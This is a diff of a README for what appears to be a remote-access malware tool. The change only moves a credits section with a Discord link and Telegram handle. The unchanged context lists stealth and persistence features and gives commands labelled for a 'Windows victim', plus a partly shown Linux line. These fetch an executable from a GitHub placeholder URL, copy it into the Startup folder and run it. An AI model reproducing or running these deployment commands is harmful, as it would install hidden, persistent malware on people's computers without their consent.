@@ -3,11 +3,6 @@
 
 https://discord.gg/vCdPTjD6rZ
 
-# Credits
-Orig - batu.sh#9675
-
-TG @udbnt
-
 # Features
 * Hidden (Works in /tmp, %temp% + Console is always hidden)
 * Persistence (Copying to /boot, shell:startup)
@@ -22,3 +17,8 @@ cd /tmp; apt-get update -y; apt-get install curl -y; curl -O LClient "https://ra
 
 # Windows victim
 cd %temp% & powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile WClient.exe & copy WClient.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" & WClient.exe
+
+# Credits
+Orig - batu.sh#9675
+
+TG @udbnt
